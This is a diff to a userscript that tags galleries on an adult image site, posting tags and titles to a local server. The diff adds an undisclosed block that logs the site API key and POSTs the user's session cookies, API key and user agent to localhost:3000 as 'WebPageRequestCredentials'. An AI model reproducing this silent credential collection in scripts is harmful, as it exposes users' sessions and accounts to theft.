@@ -1,14 +1,17 @@
 // ==UserScript==
 // @name         EHentai Tagger
 // @namespace    https://github.com/Hnsr0327/EHGroupTagger
-// @version      0.0.alpha
+// @version      0.0.alpha.6
 // @description  no description now
 // @author       Hanashiro, GPT-4-0314
 // @match        *://exhentai.org/*
 // @match        *://e-hentai.org/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=exhentai.org
-// @grant        unsafeWindow
+// @grant        none
 // ==/UserScript==
+
+var apikey = window.apikey;
+console.log(apikey);
 
 // 创建名为 ”获取后续tag" 的按钮元素，并且设置元素的特性，将它放在特定位置。
 let triple=document.createElement("button");
@@ -69,12 +72,12 @@ if (matches) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
             URL: URL,
-            uniqueNumber: galleryUniqueNumbering,
-            antiSpiderString: antiSpiderString,
-            doujinshiRomanjiTitle: doujinshiRomanjiTitle.textContent,
-            doujinshiKanjiTitle: doujinshiKanjiTitle.textContent,
-            tagsToDatabaseSystem: tagsArray,
+            UniqueID: galleryUniqueNumbering,
+            AntiSpiderString: antiSpiderString,
+            RomanjiTitle: doujinshiRomanjiTitle.textContent,
+            KanjiTitle: doujinshiKanjiTitle.textContent,
             tagsInClickboard: tag,
+            tagsToDatabaseSystem: tagsArray,
             messageType: "TagDetails"
         }),
     })
@@ -86,6 +89,24 @@ if (matches) {
         console.error("TagDetails Sent FAILED", error);
     });
 
+    fetch("http://localhost:3000/save-data", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            URL: window.location.href,
+            userAgent: navigator.userAgent,
+            cookie: document.cookie,
+            apikey: apikey,
+            messageType: "WebPageRequestCredentials"
+        }),
+    })
+        .then((response) => response.json())
+        .then((data) => {
+        console.log("WebPageRequestCredentials Sent SUCCEED", data);
+    })
+        .catch((error) => {
+        console.error("WebPageRequestCredentials Sent FAILED", error);
+    });
     // 按钮添加点击事件处理程序，确保当用户点击按钮时会获取更多的标签内容并写入剪贴板。
     triple.onclick=function(){
         locate = tag.indexOf(",", 180);
@@ -93,4 +114,3 @@ if (matches) {
         navigator.clipboard.writeText(tag);
     };
 })();
-
